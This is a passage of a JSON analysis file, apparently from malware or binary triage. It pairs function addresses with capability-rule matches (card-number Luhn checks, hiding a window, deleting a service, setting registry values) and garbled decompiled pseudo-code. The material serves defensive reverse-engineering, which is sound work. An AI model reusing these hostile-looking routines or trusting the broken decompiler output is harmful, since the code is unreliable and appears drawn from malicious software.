            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403750(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404460(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 52
    },
    "00403770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403770(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00403fa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get Program Files directory"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404066) overlaps instruction at (ram,0x00404064)\n// \n// WARNING: Removing unreachable block (ram,0x004040c6)\n// WARNING: Removing unreachable block (ram,0x004040d4)\n// WARNING: Removing unreachable block (ram,0x004040d6)\n// WARNING: Removing unreachable block (ram,0x00404090)\n// WARNING: Removing unreachable block (ram,0x00404064)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00403fa0(uint param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint8_t extraout_CL;\n    uint uVar6;\n    int32_t unaff_EBX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    uchar uVar9;\n    char cVar10;\n    bool bVar11;\n    char cVar12;\n    ulong uVar13;\n    uchar lpszPath;\n    uint var_25fh;\n    uchar lpCommandLine;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    bVar8 = &stack0xfffffffc < 0x260;\n    bVar11 = SBORROW4(&stack0xfffffffc, 0x260);\n    if ((!bVar8) && (bVar8)) {\n        piVar5 = unaff_EBX + 0x69 + param_2 * 4;\n        bVar11 = SCARRY4(unaff_EBX, *piVar5) != SCARRY4(unaff_EBX + *piVar5, bVar8);\n    }\n    iVar4 = fcn.00403110();\n    if (((!bVar11) && (bVar11)) || (iVar4 = fcn.004037a0(),  iVar4 != 0)) {\n        piVar5 = iVar4 + 1;\n        *unaff_EDI = *unaff_ESI;\n        *piVar5 = *piVar5 + piVar5;\n        *(unaff_ESI + 0x56) = *(unaff_ESI + 0x56) + (piVar5 >> 8);\n        lpszPath = 0;\n        puVar7 = &var_25fh;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &lpszPath, 0x26, 0);\n        if (iVar4 != 0) {\n            fcn.00403670();\n            lpCommandLine = 0;\n            puVar7 = &var_15bh;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n            (*_sym.imp.MSVCRT.dll_sprintf)(&lpCommandLine, 0x411610, &lpszPath, 0x4115f0, 3);\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar7 = &var_58h;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                hProcess = 0;\n                var_58h = 0x44;\n                var_ch = 0;\n                var_2ch = 1;\n                lParam = 0;\n                var_28h._0_2_ = 0;\n                var_4h = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                                  (0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                cVar12 = '\\0';\n                cVar10 = iVar4 < 0;\n                uVar9 = iVar4 == 0;\n                if (uVar9) {\n                    return;\n                }\n                (*pcVar2)(3000);\n                uVar13 = (*_sym.imp.USER32.dll_EnumWindows)(fcn.00403e90, lParam);\n                uVar6 = hProcess;\n                if ((!uVar9 && cVar12 == cVar10) && (uVar9 || cVar12 != cVar10)) {\n                    puVar1 = uVar13 + -0x74c625aa;\n                    *puVar1 = *puVar1 ^ extraout_CL;\n                    LOCK();\n                    uVar6 = uVar13 >> 0x20;\n                }\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar6, 1000);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar3)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1363
    },
    "00404b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404b50(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    uVar2 = fcn.004035d0(uVar1, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n    return uVar2;\n}\n",
        "token_count": 118
    },
    "00401c70": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401c70(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00402440": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402440(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411270, 0x42372c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 138
    },
    "004010d0": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040111b)\n\nuint __cdecl fcn.004010d0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint32_t in_EAX;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    bool in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        if (in_CF || unaff_EBX + 1 == 0) goto code_r0x0040112f;\n        uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n        piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, in_EAX + uVar2 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    unaff_ESI = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (unaff_ESI == 0) {\n        return 0;\n    }\n    unaff_EDI = (*_sym.imp.ADVAPI32.dll_DeleteService)(unaff_ESI);\ncode_r0x0040112f:\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(unaff_ESI);\n    return unaff_EDI;\n}\n",
        "token_count": 359
    },
    "00401cb0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d26) overlaps instruction at (ram,0x00401d25)\n// \n// WARNING: Removing unreachable block (ram,0x00401cfe)\n// WARNING: Removing unreachable block (ram,0x00401d0c)\n// WARNING: Removing unreachable block (ram,0x00401d26)\n\nvoid __cdecl fcn.00401cb0(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, char *arg_14h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t in_EAX;\n    char *pcVar3;\n    uint8_t unaff_BL;\n    char *pcVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    \n    pcVar3 = NULL;\n    bVar5 = false;\n    bVar7 = false;\n    pcVar4 = arg_14h;\n    if (arg_14h != NULL) {\n        do {\n            cVar1 = in_EAX;\n            bVar6 = pcVar4 < 0;\n            if ((bVar5) || (!bVar5)) {\n                unaff_BL = pcVar3[arg_10h];\n            }\n            else {\n                cVar2 = cVar1 + '\\r' + !bVar5;\n                *(arg_10h + 0x43d1773a) = *(arg_10h + 0x43d1773a) ^ 0x8a27e95e;\n                cVar1 = cVar2 + -0x31;\n                bVar7 = SBORROW1(cVar2, '1') != false;\n                bVar6 = cVar1 < '\\0';\n            }\n            if ((bVar7 == bVar6) && (bVar7 != bVar6)) {\n                arg_10h = arg_10h + -1;\n                pcVar4 = arg_14h | &stack0xfffffffc;\n                arg_14h = pcVar4 + 1;\n                *pcVar4 = cVar1;\n            }\n            unaff_BL = unaff_BL ^ *(pcVar3 % arg_ch + arg_8h);\n            in_EAX = arg_8h;\n            if ((-1 < unaff_BL) && (-1 >= unaff_BL)) {\n                arg_10h = arg_10h + -1;\n                pcVar4 = arg_14h | &stack0xfffffffc;\n                arg_14h = pcVar4 + 1;\n                *pcVar4 = arg_8h;\n                in_EAX = arg_8h + (arg_8h >> 8) * 'y';\n            }\n            pcVar3[arg_10h] = unaff_BL;\n            pcVar3 = pcVar3 + 1;\n            bVar5 = pcVar3 < arg_14h;\n            bVar7 = SBORROW4(pcVar3, arg_14h);\n            pcVar4 = pcVar3 + -arg_14h;\n        } while (bVar5);\n    }\n    return;\n}\n",
        "token_count": 681
    },
    "00402510": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402510(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41143c, 0x411480, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}